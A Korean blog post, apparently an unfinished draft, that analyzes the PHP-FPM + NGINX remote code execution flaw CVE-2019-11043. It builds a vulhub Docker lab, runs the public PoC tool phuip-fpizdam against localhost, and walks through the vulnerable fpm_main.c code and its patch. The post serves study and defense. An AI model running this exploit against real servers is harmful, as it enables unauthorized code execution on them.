---
layout: post
title: '[위협] PHP-FPM + NGINX RCE(CVE-2019-11043)'
subtitle: 'threat, php, fpm, nginx'
categories: threat
tags: application
comments: true
---

> 이 글은 어플리케이션 취약점을 분석한 글입니다. 출처: https://paper.seebug.org/1064/

# PHP-FPM + NGINX RCE

- PHP 7+
- CentOS 8

<br>
<br>

PHP-FPM(FastCGI Process Manager)은 동적 페이지를 빠르게 처리하기 위해 NginX, Apache와 연동하여 사용하는 CGI 이다.

해당 취약점은 아래와 같이 잘못된 NginX configuration으로 PHP-FPM을 사용할 경우 발생한다.

![](https://chanbin.github.io/assets/img/php-fpm/1.png)<br>
<center>해당 취약점에 대한 bug fix 내용</center>
> 출처: https://github.com/php/php-src/commit/ab061f95ca966731b1c84cf5b7b20155c0a1c06a#diff-624bdd47ab6847d777e15327976a9227

## 직접 공격해 보도록 하자. 

취약성을 가진 환경을 만들기 위해, Exploit DB에서 제공하는 `vulhub` 깃에서 도커 이미지를 받아온다.

```bash
[test@localhost Desktop]$ git mkdir test
[test@localhost test]$ git init
[test@localhost test]$ git config core.sparseCheckout true
[test@localhost test]$ git remote add -f origin https://github.com/vulhub/vulhub
[test@localhost test]$ echo "php/CVE-2019-11043" >> .git/info/sparse-Checkout
[test@localhost test]$ git pull origin master
[test@localhost test]$ mv -v CVE-2019-11043/ /home/유저아이디/Desktop/
[test@localhost test]$ rm -rf test
[test@localhost CVE-2019-11043]$ sudo docker-compose up -d
```

![](https://chanbin.github.io/assets/img/php-fpm/2.png)<br>
<center>취약한 환경 구축</center>

<br>
<br>

Github에서 PoC 코드를 다운받아 공격 명령을 실행해본다.<br>해당 코드는 `golang`으로 작성되었다.

```bash
[test@localhost Desktop]$ sudo vi /etc/resolv.conf
nameserver 8.8.8.8 추가
[test@localhost Desktop]$ wget https://dl.google.com/go/go1.13.5.linux-amd64.tar.gz
[test@localhost Desktop]$ tar -xzf go1.13.5.linux-amd64.tar.gz
[test@localhost Desktop]$ sudo mv go /usr/local
[test@localhost Desktop]$ mkdir test
[test@localhost Desktop]$ export GOROOT=/usr/local/go
[test@localhost Desktop]$ export GOPATH=$HOME/Desktop/test
[test@localhost Desktop]$ export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
# 환경변수를 유지하기 위해서는 ~/.bash_profile 파일에 입력해야 한다.
[test@localhost test]$ go get -v github.com/neex/phuip-fpizdam
[test@localhost test]$ go install github.com/neex/phuip-fpizdam
[test@localhost Desktop]$ phuip-fpizdam http://127.0.0.1:8080/index.php
[test@localhost test]$ 
```

![](https://chanbin.github.io/assets/img/php-fpm/3.png)<br>
<center>취약점을 통해 파일 작성 후 원격 코드 실행 화면</center>

<br>
<br>

## 이제 분석해 보도록 하자. 

취약점 패치 내역을 다시 보면 `path_info` 변수의 조건에 문자열 길이 필터를 추가하여, false 값으로 유도하지 못하게 하고있다.

![](https://chanbin.github.io/assets/img/php-fpm/1.png)<br>
<center>해당 취약점에 대한 bug fix 내용</center>
> 출처: https://github.com/php/php-src/commit/ab061f95ca966731b1c84cf5b7b20155c0a1c06a#diff-624bdd47ab6847d777e15327976a9227

취약점 제보자의 문서를 찾아보면 `fastcgi_split_path_info` 지시문의 정규표현식은 개행 문자(\n,%0A)를 사용하여 해제할 수 있다. 정규표현식이 제대로 작동하지 않으므로 `PATH_INFO`는 취약점의 트리거가 될 수 있다라고 나온다.

> The regexp in `fastcgi_split_path_info` directive can be broken using the newline character (in encoded form, %0a). Broken regexp leads to empty PATH_INFO, which triggers the bug.

이 말은, 위 사진의 수정되기 전 코드를 보면, `path_info`값이 NULL값으로 설정될 수 있다는 뜻이다.

소스코드를 자세히 보면,

```c
# php-src/sapi/fpm/fpm/fpm_main.c 파일
989		char *env_path_info = FCGI_GETENV(request, "PATH_INFO");
		...
1108	char *pt = estrndup(script_path_translated, script_path_translated_len);
		...
1131	int ptlen = strlen(pt);
1132	int slen = len - ptlen;
1133	int pilen = env_path_info ? strlen(env_path_info) : 0;
1134	int tflag = 0;
1135	char *path_info;
1136	if (apache_was_here) {
1137		/* recall that PATH_INFO won't exist */
1138		path_info = script_path_translated + ptlen;
1139		tflag = (slen != 0 && (!orig_path_info || strcmp(orig_path_info, path_info) != 0));
1140	} else {
1141		path_info = (env_path_info && pilen > slen) ? env_path_info + pilen - slen : NULL;
1142		tflag = path_info && (orig_path_info != path_info);
1143	}
		...
```

`env_path_info` 는 FastCGI 모듈의 환경변수를 가져오는 FCGI_GETENV함수로, 클라이언트의 요청값에서 `PATH_INFO`(path_info와 동일)의 문자열 주소값을 가지고 있습니다.

클라이언트의 잘못된 요청으로 `path_info`가 NULL이 되면 1133번째 줄의 코드대로, `pilen = 0`이 된다. 참고로, C언어에서 `변수선언 = 조건? 참 : 거짓;`라는 문법이 존재한다. 조건이 참일 시 콜론(:)앞의 값으로 선언이, 거짓일 시 콜론 뒤의 값으로 선언이 이루어 진다.

`pt`는 


<br>
<br>

작성 중...